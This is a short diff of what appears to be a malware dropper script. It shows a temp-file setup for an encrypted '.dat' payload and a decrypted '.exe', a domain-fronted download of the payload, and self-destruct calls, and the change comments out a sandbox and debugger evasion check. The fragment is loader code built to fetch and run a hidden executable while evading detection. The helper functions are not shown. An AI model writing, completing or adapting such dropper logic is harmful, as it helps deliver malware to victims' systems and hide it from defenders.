@@ -28,7 +28,7 @@ payloadPath = BuildTempPath(".dat")
 decryptedPath = BuildTempPath(".exe")
 
 ' Anti-analysis checks
-If IsSandboxed() Or IsDebugging() Then SelfDestruct()
+'If IsSandboxed() Or IsDebugging() Then SelfDestruct()
 
 ' Domain-fronted download
 If Not DownloadWithDomainFronting(PAYLOAD_URL, REAL_HOST, payloadPath) Then SelfDestruct()
